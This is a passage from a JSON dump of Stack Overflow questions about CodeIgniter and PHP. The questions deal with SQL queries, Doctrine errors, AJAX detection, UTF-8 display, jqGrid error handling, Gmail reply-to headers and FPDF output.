<p>Line Number: 22</p>\n</blockquote>\n\n<p>hotels_mng_view.php</p>\n\n<pre><code>&lt;?php \n  echo $most_view_hotels;\n  foreach($most_view_hotels as $value):\n?&gt;\n  &lt;div class=\"row\"&gt;\n  &lt;div class=\"cell en\"&gt;adsf&lt;/div&gt;\n  &lt;div class=\"cell en\"&gt;1212&lt;/div&gt;\n  &lt;div class=\"cell en\"&gt;12&lt;/div&gt;\n  &lt;div class=\"cell en\"&gt;32&lt;/div&gt;\n  &lt;/div&gt;\n&lt;?php endforeach;?&gt;\n</code></pre>\n"},{"tags":["php","mysql","codeigniter","activerecord"],"answer_count":2,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":32,"score":0,"question_id":13189132,"title":"MySQL Query Statement converted to Codeigniter Active record style query statement with SUM()","body":"<p>Im trying to figure out the best way to convert this mysql query</p>\n\n<pre><code>SELECT\n        SUM(invite.friendID = $mID AND invite.decidedwhen = '0000-00-00 00:00:00' AND evnt.ends &gt;= '$event_ts' and invite.isactive = 0 and evnt.isactive = 0) AS invites_undecided,\n        SUM(invite.friendID = $mID AND invite.decidedwhen != '0000-00-00 00:00:00' AND invite.yes = 1 AND evnt.ends &gt;= '$event_ts' and invite.isactive = 0) and evnt.isactive = 0 AS invites_yes,\n        SUM(invite.friendID = $mID AND invite.decidedwhen != '0000-00-00 00:00:00' AND invite.no = 1 AND evnt.ends &gt;= '$event_ts' and invite.isactive = 0 and evnt.isactive = 0) AS invites_no,\n        SUM(invite.friendID = $mID AND invite.decidedwhen != '0000-00-00 00:00:00' AND invite.maybe = 1 AND evnt.ends &gt;= '$event_ts' and invite.isactive = 0 and evnt.isactive = 0) AS invites_maybe\nFROM user_event_invite AS invite\nJOIN user_event AS evnt ON evnt.eID = invite.eID\n</code></pre>\n\n<p>to something that uses Codeigniters active record formatting. EG</p>\n\n<pre><code>$this-&gt;db-&gt;select()\n  -&gt;from('user_event')\n  -&gt;... something?\n</code></pre>\n\n<p>The standard mysql statement works just fine. But in the name of sticking uniform to everything I'd like to use the active record. Any way of doing this? I can't find anything for <code>SUM()</code> </p>\n"},{"tags":["php","validation","codeigniter","php-errors"],"answer_count":4,"favorite_count":0,"up_vote_count":4,"down_vote_count":1,"view_count":228,"score":3,"question_id":7195667,"title":"White Page of Death on submit","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/12769982/reference-what-does-this-error-mean-in-php\">Reference - What does this error mean in PHP?</a>  </p>\n</blockquote>\n\n\n\n<p>I am having an issue with the following section of code:</p>\n\n<p>I can get the error notices in the validation but the next step = valid code I just get a white page,  Any Ideas?</p>\n\n<p>I have checked the error settings and I have set it in the public_html php.ini file and I still don't get errors</p>\n\n<pre><code>function create_sale()\n{       \n$this-&gt;template-&gt;append_metadata( js('debounce.js', 'sales') );        \n$this-&gt;template-&gt;append_metadata( js('new_sale.js', 'sales') );        \n\n    // -------------------------------------\n    // Validation &amp; Setup\n    // -------------------------------------\n\n    $this-&gt;load-&gt;library('form_validation');\n\n    $this-&gt;sale_rules[1]['rules'] .= '|callback__check_slug[insert]';\n\n    $this-&gt;form_validation-&gt;set_rules( $this-&gt;sale_rules );\n\n    foreach($this-&gt;sale_rules as $key =&gt; $rule)\n    {\n        $sale-&gt;{$rule['field']} = $this-&gt;input-&gt;post($rule['field'], TRUE);\n    }\n\n    // -------------------------------------\n    // Process Data\n    // -------------------------------------\n\n    if ($this-&gt;form_validation-&gt;run())\n    {\n        if( ! $this-&gt;sales_m-&gt;insert_new_sale( $sale, $this-&gt;user-&gt;id ) ):\n        {\n            $this-&gt;session-&gt;set_flashdata('notice', lang('sales.new_sale_error'));  \n        }\n        else:\n        {\n\n            $this-&gt;session-&gt;set_flashdata('success', lang('sales.new_sale_success'));   \n        }\n        endif;\n\n        redirect('admin/sales');\n    }\n\n    $this-&gt;template-&gt;set('sale', $sale)\n                   -&gt;build('admin/new');\n\n}   \n</code></pre>\n"},{"tags":["php","orm","codeigniter","doctrine"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":3331,"score":1,"question_id":2648961,"title":"Doctrine Fatal Error - Unknown relation alias","body":"<p>I am getting following error message:</p>\n\n<blockquote>\n  <p>Doctrine_Table_Exception: Unknown relation alias shoesTable in /home/public_html/projects/giftshoes/system/database/doctrine/Doctrine/Relation/Parser.php on line 237</p>\n</blockquote>\n\n<p>I am using doctrine 1.2.2 with Codeigniter</p>\n\n<p>My Code is below: (BaseShoes.php and Shoes.php is auto generated)</p>\n\n<p>------------BaseShoes------------</p>\n\n<pre><code>&lt;?php\n// Connection Component Binding\nDoctrine_Manager::getInstance()-&gt;bindComponent('Shoes', 'sadiqsof_giftshoes');\n\n/**\n * BaseShoes\n * \n * This class has been auto-generated by the Doctrine ORM Framework\n * \n * @property integer $sku\n * @property string $name\n * @property string $keywords\n * @property string $description\n * @property string $manufacturer\n * @property float $sale_price\n * @property float $price\n * @property string $url\n * @property string $image\n * @property string $category\n * @property Doctrine_Collection $Viewes\n * \n * @package    ##PACKAGE##\n * @subpackage ##SUBPACKAGE##\n * @author     ##NAME## &lt;##EMAIL##&gt;\n * @version    SVN: $Id: Builder.php 6820 2009-11-30 17:27:49Z jwage $\n */\nabstract class BaseShoes extends Doctrine_Record\n{\n    public function setTableDefinition()\n    {\n        $this-&gt;setTableName('shoes');\n        $this-&gt;hasColumn('sku', 'integer', 4, array(\n             'type' =&gt; 'integer',\n             'fixed' =&gt; 0,\n             'unsigned' =&gt; false,\n             'primary' =&gt; true,\n             'autoincrement' =&gt; false,\n             'length' =&gt; '4',\n             ));\n        $this-&gt;hasColumn('name', 'string', 255, array(\n             'type' =&gt; 'string',\n             'fixed' =&gt; 0,\n             'unsigned' =&gt; false,\n             'primary' =&gt; false,\n             'notnull' =&gt; true,\n             'autoincrement' =&gt; false,\n             'length' =&gt; '255',\n             ));\n        $this-&gt;hasColumn('keywords', 'string', 255, array(\n             'type' =&gt; 'string',\n             'fixed' =&gt; 0,\n             'unsigned' =&gt; false,\n             'primary' =&gt; false,\n             'notnull' =&gt; true,\n             'autoincrement' =&gt; false,\n             'length' =&gt; '255',\n             ));\n        $this-&gt;hasColumn('description', 'string', null, array(\n             'type' =&gt; 'string',\n             'fixed' =&gt; 0,\n             'unsigned' =&gt; false,\n             'primary' =&gt; false,\n             'notnull' =&gt; true,\n             'autoincrement' =&gt; false,\n             'length' =&gt; '',\n             ));\n        $this-&gt;hasColumn('manufacturer', 'string', 20, array(\n             'type' =&gt; 'string',\n             'fixed' =&gt; 0,\n             'unsigned' =&gt; false,\n             'primary' =&gt; false,\n             'notnull' =&gt; true,\n             'autoincrement' =&gt; false,\n             'length' =&gt; '20',\n             ));\n        $this-&gt;hasColumn('sale_price', 'float', null, array(\n             'type' =&gt; 'float',\n             'fixed' =&gt; 0,\n             'unsigned' =&gt; false,\n             'primary' =&gt; false,\n             'notnull' =&gt; true,\n             'autoincrement' =&gt; false,\n             'length' =&gt; '',\n             ));\n        $this-&gt;hasColumn('price', 'float', null, array(\n             'type' =&gt; 'float',\n             'fixed' =&gt; 0,\n             'unsigned' =&gt; false,\n             'primary' =&gt; false,\n             'notnull' =&gt; true,\n             'autoincrement' =&gt; false,\n             'length' =&gt; '',\n             ));\n        $this-&gt;hasColumn('url', 'string', null, array(\n             'type' =&gt; 'string',\n             'fixed' =&gt; 0,\n             'unsigned' =&gt; false,\n             'primary' =&gt; false,\n             'notnull' =&gt; true,\n             'autoincrement' =&gt; false,\n             'length' =&gt; '',\n             ));\n        $this-&gt;hasColumn('image', 'string', null, array(\n             'type' =&gt; 'string',\n             'fixed' =&gt; 0,\n             'unsigned' =&gt; false,\n             'primary' =&gt; false,\n             'notnull' =&gt; true,\n             'autoincrement' =&gt; false,\n             'length' =&gt; '',\n             ));\n        $this-&gt;hasColumn('category', 'string', 50, array(\n             'type' =&gt; 'string',\n             'fixed' =&gt; 0,\n             'unsigned' =&gt; false,\n             'primary' =&gt; false,\n             'notnull' =&gt; true,\n             'autoincrement' =&gt; false,\n             'length' =&gt; '50',\n             ));\n    }\n\n    public function setUp()\n    {\n        parent::setUp();\n        $this-&gt;hasMany('Viewes', array(\n             'local' =&gt; 'sku',\n             'foreign' =&gt; 'sku'));\n    }\n}\n</code></pre>\n\n<p>--------------ShoesTable--------</p>\n\n<pre><code>&lt;?php\nclass ShoesTable extends Doctrine_Table\n{\n    function getAllShoes($from = 0, $total = 15)\n    {\n        $q = Doctrine_Query::create()\n        -&gt;from('Shoes')\n        -&gt;limit($total)\n        -&gt;offset($from);\n\n        return $q-&gt;execute(array(), Doctrine::HYDRATE_ARRAY);\n    }\n\n}\n</code></pre>\n\n<p>---------------Shoes Model-----------------</p>\n\n<pre><code>&lt;?php\n\n/**\n * Shoes\n * \n * This class has been auto-generated by the Doctrine ORM Framework\n * \n * @package    ##PACKAGE##\n * @subpackage ##SUBPACKAGE##\n * @author     ##NAME## &lt;##EMAIL##&gt;\n * @version    SVN: $Id: Builder.php 6820 2009-11-30 17:27:49Z jwage $\n */\nclass Shoes extends BaseShoes\n{\n    function  __construct() {\n        parent::__construct();\n        $this-&gt;shoesTable = Doctrine::getTable('Shoes');\n    }\n\n    function getAllShoes()\n    {\n        return $this-&gt;shoesTable-&gt;getAllShoes();\n    }\n\n}\n</code></pre>\n"},{"tags":["php","sql","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":43,"score":-1,"question_id":13188336,"title":"How to get the average price based on multiple room prices","body":"<p>I have table called room_prices that store different prices according to the date specified. Here's the sample data.</p>\n\n<pre><code>id  room_id date_from   date_to     price\n1   1                               3500.00\n25  1       7/28/2012   7/29/2012   3600.00\n27  1       8/24/2012   8/27/2012   3000.00\n49  1       11/12/2012  11/16/2012  4000.00\n</code></pre>\n\n<p>The first row is the default price of room 1 (room_id = 1).</p>\n\n<p>When guest reserve a room, the system will first look at the prices on room_prices table. If the date reserved by guest was found on the table it will get the price according to the date selected and not the default price.</p>\n\n<p>Ex.</p>\n\n<p>If the guest reserved a room from 11/10/2012 to 11/11/2012 then the price should be 3,500.\nIf the guest reserved a room from 11/12/2012 to 11/14/2012 then the price should be 4,000.</p>\n\n<p>If the guest reserved a room from 11/10/2012 to 11/13/2012 then the average price should be 3750. See table below:</p>\n\n<pre><code>11/10/2012  3500\n11/11/2012  3500\n11/12/2012  4000\n11/13/2012  4000\n            3750\n</code></pre>\n\n<p>So my question is if there is a single SQL code to get the average price.</p>\n\n<p>update:</p>\n\n<p>I tried this sql to no avail:</p>\n\n<pre><code>SELECT avg(price) as avg_price\n                        FROM lf_rooms_prices\n                        WHERE room_id = 1\n                        AND ((DATE_FORMAT(date_from, '%m/%d/%Y') &gt;= '11/10/2012' \n                        AND DATE_FORMAT(date_from, '%m/%d/%Y') &lt; '11/10/2012') \n                        OR (DATE_FORMAT(date_to, '%m/%d/%Y') &gt; '11/13/2012' \n                        AND DATE_FORMAT(date_to, '%m/%d/%Y') &lt;= '11/13/2012'))\n</code></pre>\n\n<p>btw, I'm using codeigniter.</p>\n"},{"tags":["php","oop","codeigniter","php-errors"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":190,"score":1,"question_id":10058874,"title":"Codeigniter -> Trying to get property of non-object","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/9780211/codeigniter-trying-to-get-property-of-non-object\">Codeigniter, Trying to get property of non-object</a>  </p>\n</blockquote>\n\n\n\n<p>What am I getting the below error:</p>\n\n<p><code>Trying to get property of non-object</code></p>\n\n<p>I can <code>print_r</code> my model and it shows the correct data but when I try and grab a singular value I get the above error:</p>\n\n<p>My controller line is: </p>\n\n<p><code>$data['companyName'] = $this-&gt;quote-&gt;getCompanyDetails-&gt;companyName;</code></p>\n\n<p><strong>My Model is:</strong></p>\n\n<pre><code>public function getCompanyDetails()\n{\n    $this-&gt;db-&gt;select('companyName,companySlogan,companyContact,\n                       companyEmail,companyWebsite,companyPhone,\n                       companyFax,companyAddress');\n    $this-&gt;db-&gt;from('companyDetails');\n\n    $result = $this-&gt;db-&gt;get();\n\n    return $result-&gt;result_array(); \n}\n</code></pre>\n"},{"tags":["php","jquery","ajax","codeigniter"],"answer_count":4,"favorite_count":4,"up_vote_count":6,"down_vote_count":0,"view_count":1659,"score":6,"question_id":4301150,"title":"How do I check if the request is made via AJAX with PHP?","body":"<p>How do I check if the request is an ajax? I am using codeigniter. I have a link that when it clicked, it'll open the pop-up dialog window this is done through ajax it requests to a controller name login_window().</p>\n\n<h3>CodeIgniter</h3>\n\n<pre><code>//Here is the controller name:\nfunction login_window(){\n    // request via ajax\n    $this-&gt;load-&gt;view(\"login_window\");\n}\n</code></pre>\n\n<h3>jQuery</h3>\n\n<pre><code>//here is the jquery code:\n//I am using a jquery plugin FACEBOX\n\n$('a[rel*=dialog]').facebox();\n\n&lt;a href=\"http://localhost/codeigniter/login_window\" rel=\"dialog\"&gt;Login&lt;/a&gt;\n</code></pre>\n\n<p>I want to check if it is an ajax request and if not, i will redirect them to homepage. so there's no way they can access the page that is intended only for ajax requests.</p>\n\n<p>Thanks</p>\n"},{"tags":["codeigniter","shopping-cart","sessionid"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":32,"score":2,"question_id":13178573,"title":"How to keep session unchanged in codeigniter?","body":"<p>I'm trying to create a shopping cart by storing the cart in a table in a database, instead of using the built-in CI cart class. I use sessionID to identify one visitor from another. But I found that the sessionID is changing for a period of time, even the visitor doesn't close the browser. </p>\n\n<p>Is this a normal behavior of CI to renew the sessionID for a short period of time? Is there a way to make it unchanged until the visitor close the browser?</p>\n\n<p>Thank you at advance.</p>\n"},{"tags":["php","codeigniter"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":44,"score":0,"question_id":13184554,"title":"should I make a class for every page in Codeigniter","body":"<p>Mostly this question is not about programming, it's like the how to use question.\nand as I said above, should i make a class for every page in codeigniter? Or I can make function's for every page? if both is right, which one is better?</p>\n"},{"tags":["php","codeigniter","file-upload"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":37,"score":3,"question_id":13187041,"title":"Can I upload .c or .cpp file using CodeIgniter?","body":"<p>This might be silly. I want to upload a .c file. I am using codeigniter. The code i am using is working for .pdf but whenever I try to upload a .c file it shows \"The filetype you are attempting to upload is not allowed.\". My code is given below.  </p>\n\n<pre><code>$config = array\n(\n    'upload_path' =&gt; './solutions',\n    'allowed_types' =&gt; 'c',\n    'file_name' =&gt; $file_name,\n    'file_size' =&gt; 1000,\n    'remove_spaces' =&gt; 'true'\n);\n$this-&gt;upload-&gt;initialize($config);\n</code></pre>\n\n<p>When i write pdf in allowed types, it works but not in the case of c. Any help would be appreciated. Thanks.</p>\n"},{"tags":["php","codeigniter","phpquery"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":112,"score":1,"question_id":11541966,"title":"phpquery codeigniter howto","body":"<p>Is there anyone that has a howto and tutorial on using phpQuery with CodeIgniter?</p>\n\n<p>I ask because I would like to manipulate certain css attributes and swap out certain css values. I could have done this with JavaScript but it's tough mixing PHP and JavaScript, so it means finding a way to manipulate HTML and css to do this. Hope y'all can help in anyway. </p>\n\n<p>so I am looking to load phpquery and use it like any other library</p>\n\n<pre><code>$this-&gt;load-&gt;libary('phpquery');\n$this-&gt;phpquery-&gt;pq('div &gt; p')-&gt;findall();\n</code></pre>\n"},{"tags":["php","mysql","codeigniter","utf-8","collation"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":51,"score":0,"question_id":13180793,"title":"UTF8 from Database does not display correctly (Codeigniter)","body":"<p>i have a webserver setup consisting of Codeigniter, Mysql and Apache.</p>\n\n<p>One a page load i fetch data from a mysql table which looks like:</p>\n\n<pre><code>CREATE TABLE IF NOT EXISTS `names_table` (\n`id` integer NOT NULL AUTO_INCREMENT PRIMARY KEY,\n....\n`name` varchar(180) NOT NULL,\n....\n) ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_bin;\n</code></pre>\n\n<p>The data on the serverside is displayed with</p>\n\n<pre><code>echo $this-&gt;db-&gt;get_where('names_table', array('id' =&gt; '6'))-&gt;result()-&gt;name;\n</code></pre>\n\n<p>The header of the page served to the client is sent via</p>\n\n<pre><code>header(\"Content-Type: text/html; charset=UTF-8\");\n</code></pre>\n\n<p>plus i am setting the meta information to</p>\n\n<pre><code>&lt;meta http-equiv=\"content-type\" content=\"text/html; charset=utf-8\"&gt;\n</code></pre>\n\n<p>The PHP file serving the client request is encoded in UTF-8 without BOM, but the name is displayed like <strong>SchÃ¶nefeld</strong> although is should be <strong>Schönefeld</strong>.</p>\n\n<p>The name field with the corresponding id in <code>names_table</code> has <em>536368c383c2b66e6566656c64</em> stored in it.</p>\n\n<p>I spent a few hours searching for possible solutions and i already applied all hints i found so far without working. Thank you very much.</p>\n\n<hr>\n\n<p>EDIT:</p>\n\n<p>Before displaying the data to the client i run</p>\n\n<pre><code>mb_detect_encoding($name_field);\n</code></pre>\n\n<p>which says it is UTF-8. I am viewing the page in Chrome where UTF-8 encoding is set, too.</p>\n\n<p>If i understand it correctly, i should not call <code>utf8_decode()</code> on the variable returned from the database because the browser already understands that the document is in UTF8 and takes appropriate action to decode it, correct?</p>\n\n<p><strong>RESOLVED</strong></p>\n\n<p>As it turns out the data in the table was not imported correctly. I had to use an explicit statement about the character set for it, like <a href=\"http://stackoverflow.com/questions/2133198/importing-bulk-csv-data-in-utf-8-into-mysql\">here</a></p>\n"},{"tags":["php","linux","codeigniter","sync","file-transfer"],"answer_count":4,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":41,"score":2,"question_id":13079245,"title":"sharing libraries across web projects","body":"<p>I have 3 PHP projects using the CodeIgniter framework which share some exact same files such as models libraries and controllers. What's the best way I could share these files across without having to keep in sync and update the same files across?</p>\n\n<ul>\n<li>In linux I thought of using dynamic links and extract these files to a central place but that kind of breaks our version control and would create portability issues.</li>\n<li>Another way perhaps to use unison on these files across projects</li>\n</ul>\n\n<p>I'm assuming that's a common problem, what are common approaches?</p>\n"},{"tags":["php","jquery","mysql","jquery-ui","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":46,"score":0,"question_id":13184431,"title":"jqgrid How to personalize the error status 'error'. error code 500","body":"<p>I´m using CodeIgniter with jquery grid. \nI have an Index in my DB that states that some combination can´t be inserted. \nUNIQUE KEY <code>user_store_index</code> (<code>Stores_idStores</code>,<code>Users_idUsers</code>). The combination of a user and a Store can´t be inserted twice. \nUsing firebux I can see the error \nA Database Error Occurred\nError Number: 1062. Duplicate entry '1-5' for key 'user_store_index'\nINSERT INTO <code>asignedto</code> (<code>Stores_idStores</code>, <code>Users_idUsers</code>) VALUES ('1', '5').</p>\n\n<p>In this case I would like to show to the user in the jqGrid the following message: \"You can´t insert this combination because it already exists\" but all I got is \"error Status: 'error'. Error code: 500\". \nI have read the explanation presented here <a href=\"http://stackoverflow.com/questions/6960208/jqgrid-server-side-error-message-validation-handling\">jqgrid server side error message/validation handling</a> and here <a href=\"http://stackoverflow.com/questions/4290821/jqgrid-server-exception-error-messages?lq=1\">jqgrid server exception error messages</a> and many others but I haven´t been able to find the solution. </p>\n\n<p>Here is the code of my jqGrid</p>\n\n<pre><code>  $(document).ready(function() {\n\n           var grid = jQuery(\"#newapi_1351802691\").jqGrid({\n                    ajaxGridOptions : {type:\"POST\"},\n                       jsonReader : {\n                       root:\"data\",\n                       repeatitems: false\n                   },\n                   loadError : function(xhr,status,error) {\n                            alert(xhr.status+','+status+','+error);  //alert 500, error, My custom error\n                    },\n                    rowList:[10,20,30],\n                    viewrecords: true\n                   ,url:'http://localhost/sp/index.php/assigment/getData'\n,editurl:'http://localhost/sp/index.php/assigment/setData'\n,datatype:'json'\n,rowNum:'12'\n,width:'800'\n,height:'300'\n,pager: '#pnewapi_1351802691'\n,caption:'Control de asignaciones'\n,colModel:[\n{name:'username',index:'username',label:'Usuario' ,align:'left',width:300,editable:false,edittype:'text',editrules:{required:true}  }\n,{name:'StoreName',index:'StoreName',label:'Tienda' ,align:'center',width:200,editable:false,edittype:'text',editrules:{required:true}  }\n,{name:'Users_idUsers',index:'Users_idUsers',label:'Usuario' ,align:'center',width:100,hidden:true,editable:true,edittype:'select',editoptions:{value:\":Select;5:tienda1;6:tienda2;17:tienda3;18:tienda11\",size:10},editrules:{edithidden:true,required:true,integer:true}  }\n,{name:'Stores_idStores',index:'Stores_idStores',label:'Tienda' ,align:'center',width:100,hidden:true,editable:true,edittype:'select',editoptions:{value:\":Select;1:EA001;3:EA003;4:EA005;5:EA006;6:EA007;7:EA008;8:EA009;9:EA010;10:EA011;11:EA012;12:EA013;13:EA015;14:EA017;15:EA018;16:EA019;17:EA020;18:EA021;19:EA022;20:EA002;21:EA000\",size:10},editrules:{edithidden:true,required:true,integer:true}  }\n,{name:'SurrugateTurn',index:'SurrugateTurn',label:'SurrugateTurn' ,align:'center',width:100,key:true,hidden:true,editable:true,edittype:'select',editoptions:{value:\":Select;1:1;19:19\",size:10},editrules:{hidden:true}  }\n]               })\n              jQuery(\"#newapi_1351802691\")\n            .jqGrid('navGrid',\n            '#pnewapi_1351802691',\n            {view:false,\n             edit:'1',\n             add:'1',\n             del:'1',\n             close:true,\n             delfunc: null ,\n             search:''\n        },\n        { recreateForm: true, \n        width : 400 ,\n        beforeShowForm : function(form) {\n\n         },\n        closeAfterEdit:true }, // edit options\n\n        {  recreateForm: true,\n        width : 400,\n         closeAfterAdd : true,\n         beforeSubmit : function(postdata, formid) {\n         var mensaje = '';\n         var resultado = true;\n\n\n\n\n          return[resultado,mensaje]; \n        }\n        }, /*add options*/\n\n        {mtype: 'POST'} /*delete options*/,\n        {sopt: ['eq','cn','ge','le' ] ,     \n        multipleSearch: false ,\n        showOnLoad : false,\n        overlay:false,mtype: 'POST'} /*search options*/\n        ).navButtonAdd('#pnewapi_1351802691',\n                { caption:'', buttonicon:'ui-icon-extlink', onClickButton:dtgOpenExportdata, position: 'last', title:'Export data', cursor: 'pointer'}\n                );\n;\n        });\n</code></pre>\n\n<p>Could you please help me with this...</p>\n"},{"tags":["php","codeigniter","email","gmail"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":63,"score":0,"question_id":13160482,"title":"Gmail uses original \"TO\" address instead of \"FROM\" address for reply","body":"<p>Using <a href=\"http://codeigniter.com/user_guide/libraries/email.html\" rel=\"nofollow\">CI's email library</a>, I have the following code to send a pw to a user:</p>\n\n<pre><code>$email_html_message         =   '&lt;html&gt;&lt;body&gt;'.\n                                        'Your password is '.$password.'&lt;br&gt;'.\n                                        '&lt;a href=\"'.  base_url().'\"&gt;Login to WOD-Minder&lt;/a&gt;'.\n                                        '&lt;/body&gt;&lt;/html&gt;';\n\n\n        $config['charset']  =   'iso-8859-1';\n        $config['mailtype'] =   'html';\n        $this-&gt;email-&gt;initialize($config);\n\n        $this-&gt;email-&gt;from('ray@wod-minder.com', 'WOD-Minder Admin');\n        $this-&gt;email-&gt;to($user_email);\n        $this-&gt;email-&gt;subject('Your WOD-Minder Login');\n        $this-&gt;email-&gt;message($email_html_message);\n        $this-&gt;email-&gt;send();\n</code></pre>\n\n<p>I tested this code on two accounts:  Gmail and my ISP's smtp email account. </p>\n\n<p>Both tests sent an email, but here's the problem:</p>\n\n<p>If I click reply through gmail, the Reply TO address is the address the e-mail was sent to:</p>\n\n<p><img src=\"http://i.stack.imgur.com/gtrsn.jpg\" alt=\"enter image description here\"></p>\n\n<p>This does not happen when I click reply through Windows Mail (e.g. my smtp account).</p>\n\n<p>Here is the \"original message\" with headers from gmail:</p>\n\n<pre><code>Delivered-To: ray023@gmail.com\nReceived: by 10.114.17.8 with SMTP id k8csp412473ldd;\n        Wed, 31 Oct 2012 07:27:06 -0700 (PDT)\nReceived: by 10.220.142.79 with SMTP id p15mr18061226vcu.71.1351693626443;\n        Wed, 31 Oct 2012 07:27:06 -0700 (PDT)\nReturn-Path: &lt;bounce-cgi-moo.ray023@yourhostingaccount.com&gt;\nReceived: from mailout12.yourhostingaccount.com (mailout12.yourhostingaccount.com. [65.254.253.98])\n        by mx.google.com with ESMTP id p5si2963631vcv.55.2012.10.31.07.27.05;\n        Wed, 31 Oct 2012 07:27:05 -0700 (PDT)\nReceived-SPF: pass (google.com: domain of bounce-cgi-moo.ray023@yourhostingaccount.com designates 65.254.253.98 as permitted sender) client-ip=65.254.253.98;\nAuthentication-Results: mx.google.com; spf=pass (google.com: domain of bounce-cgi-moo.ray023@yourhostingaccount.com designates 65.254.253.98 as permitted sender) smtp.mail=bounce-cgi-moo.ray023@yourhostingaccount.com\nReceived: from mailscan13.yourhostingaccount.com ([10.1.15.13] helo=mailscan13.yourhostingaccount.com)\n    by mailout12.yourhostingaccount.com with esmtp (Exim)\n    id 1TTZG5-0005Lf-Dt\n    for ray023@gmail.com; Wed, 31 Oct 2012 10:27:05 -0400\nReceived: from impout01.yourhostingaccount.com ([10.1.55.1] helo=impout01.yourhostingaccount.com)\n    by mailscan13.yourhostingaccount.com with esmtp (Exim)\n    id 1TTZG2-0007KY-GM\n    for ray023@gmail.com; Wed, 31 Oct 2012 10:27:02 -0400\nReceived: from cgi1703.yourhostingaccount.com ([10.1.12.150])\n    by impout01.yourhostingaccount.com with NO UCE\n    id HqT21k00s3EEVBe01qT2XN; Wed, 31 Oct 2012 10:27:02 -0400\nX-Authority-Analysis: v=2.0 cv=IICA+3TG c=1 sm=1 a=0bVzInp0yugA:10\n a=UT1nndvi2uwA:10 a=e1QP36Bl1McA:10 a=Gm7PUgscJ9MA:10 a=jPJDawAOAc8A:10\n a=mM4-eZ0ns8IA:10 a=PgEUWBzPAAAA:8 a=2RTERvT5bsMA:10 a=t2MNXjrCa7SdDSCJ3MYA:9\n a=wPNLvfGTeEIA:10 a=_W_S_7VecoQA:10 a=MvC2+Uy32Q89d9+Fzzoamg==:117\nX-EN-OrigOutIP: 10.1.12.150\nX-EN-IMPSID: HqT21k00s3EEVBe01qT2XN\nReceived: from moo.ray023 by cgi1703.yourhostingaccount.com with local (Exim)\n    id 1TTZFR-0003Hw-20\n    for ray023@gmail.com; Wed, 31 Oct 2012 10:26:25 -0400\nX-EN-Info: U=moo.ray023 P=/index.php\nX-EN-CGIUser: moo.ray023\nX-EN-CGIPath: /index.php\nX-EN-OrigIP: 173.191.128.136\nTo: ray023@gmail.com\nSubject: =?iso-8859-1?Q?Your_WOD-Minder_Login?=\nX-PHP-Originating-Script: 3651509:Email.php\nUser-Agent: CodeIgniter\nDate: Wed, 31 Oct 2012 10:26:24 -0400\nFrom: \"WOD-Minder Admin\" &lt;ray@wod-minder.com&gt;\nReply-To: \"ray@wod-minder.com\" &lt;ray@wod-minder.com&gt;\nX-Sender: ray@wod-minder.com\nX-Mailer: CodeIgniter\nX-Priority: 3 (Normal)\nMessage-ID: &lt;5091351101295@wod-minder.com&gt;\nMime-Version: 1.0\nContent-Type: multipart/alternative; boundary=\"B_ALT_50913511012dd\"\nX-EN-Timestamp: Wed, 31 Oct 2012 10:26:25 -0400\nSender:  \"WOD-Minder Admin\" &lt;ray@wod-minder.com&gt;\n\nThis is a multi-part message in MIME format.\nYour email application may not support this format.\n\n--B_ALT_50913511012dd\nContent-Type: text/plain; charset=iso-8859-1\nContent-Transfer-Encoding: 8bit\n\nYour password is Login to WOD-Minder\n\n\n--B_ALT_50913511012dd\nContent-Type: text/html; charset=iso-8859-1\nContent-Transfer-Encoding: quoted-printable\n\n&lt;html&gt;&lt;body&gt;Your password is &lt;br&gt;&lt;a href=3D\"http://wod-minder.com/\"&gt;Logi=\nn to WOD-Minder&lt;/a&gt;&lt;/body&gt;&lt;/html&gt;\n\n--B_ALT_50913511012dd--\n</code></pre>\n\n<p>Any idea on how to fix this with gmail?</p>\n"},{"tags":["php","jquery","ajax","codeigniter","codeigniter-2"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":1258,"score":0,"question_id":9643236,"title":"Open Fpdf JSON response, in new window, to save PDF. - PHP","body":"<p>I'm trying to send a Json array over using an AJAX call to a controller function which processes the data using a FPDF library which is already implemented into Codeigniter. I can see the PDF data being returned, but how would I go about opening this PDF data in a new window so the PDF can be saved. It doesn't matter if the PDF cant be viewed i just need to save the generated file.</p>\n\n<p>Here's the code I have so far:</p>\n\n<p><strong>Jquery Code</strong></p>\n\n<pre><code>&lt;script defer=\"defer\" type=\"text/javascript\"&gt;\n$(document).ready(function() {\n    $('a#export').click(function(exportRecord) {    \n        var postData = {\n            'record_type'   : 1,\n            'title' : 'Some Title Here',\n            'content' : 'Some content here',\n        };\n        $.ajax({\n                url: \"&lt;?php echo base_url().'admin/pdf/createPDF';?&gt;\",\n                type:'POST',\n                data: postData,\n                dataType: 'json',\n                success: function(data){\n                        window.open(\n                            'data:application/pdf,'+encodeURIComponent(data),\n                            'Batch Print',\n                            'width=600,height=600,location=_newtab'\n                        );\n                    } // End of success function of ajax form\n        }); // End of ajax call\n        return false;\n    });\n});\n&lt;/script&gt;\n</code></pre>\n\n<p><strong>The Controller Function</strong></p>\n\n<pre><code>&lt;?php\n    function createPDF(){       \n            $content = $this-&gt;input-&gt;post('content');\n            $font_directory = './assets/fpdf_fonts/';\n            set_realpath($font_directory);\n            define('FPDF_FONTPATH',$font_directory);\n            $data = $this-&gt;fpdf-&gt;Open();\n            $data = $this-&gt;fpdf-&gt;AddPage();\n            $data = 